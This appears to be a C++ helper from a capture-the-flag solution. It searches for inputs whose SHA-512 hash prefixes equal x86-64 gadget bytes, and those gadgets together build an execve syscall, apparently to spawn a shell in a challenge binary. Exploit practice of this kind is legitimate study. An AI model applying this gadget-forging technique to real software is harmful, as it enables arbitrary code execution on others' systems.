#include <algorithm>
#include <stdexcept>
#include <iostream>
#include <memory>
#include <vector>
#include <tuple>
#include <map>

#include <unistd.h>

#include <sys/mman.h>
#include <openssl/sha.h>
// Hash

std::string generate_hash(std::string const s) {
    unsigned char *hash = new unsigned char[SHA512_DIGEST_LENGTH];

    SHA512_CTX sha512;
    SHA512_Init(&sha512);
    SHA512_Update(&sha512, s.c_str(), s.size());
    SHA512_Final(hash, &sha512);

    std::string ret = "";
    for(size_t i = 0; i < 4; ++i) {
        ret += hash[i];
    }

    delete[] hash;
    return ret;
}

bool cmp(std::string const &a, std::string const &b) {
    for(size_t i = 0; i < b.size() && i < a.size(); ++i) {
        if(a[i] != b[i]) {
            return false;
        }
    }

    return true;
}

int main() {
    std::vector<std::string> const rop = {
        "\x48\x89\xe6\xc3",
        "\x48\xff\xce\xc3",
        "\x31\xff\xc3",
        "\x48\x89\x3e",
        "\x5f\xc3",
        "\xb0\x3b\xc3",
        "\x31\xd2\xc3",
        "\x0f\x05\xc3"
    };

    std::string prefix;
    std::cout << "Prefix: " << std::flush;
    std::cin >> prefix;

    for(auto rop_line : rop) {
        size_t i = 0;
        while(!cmp( generate_hash(prefix + std::to_string(i)), rop_line)) {
            ++i;
        }
        std::cout << prefix << i << std::endl;
    }
}
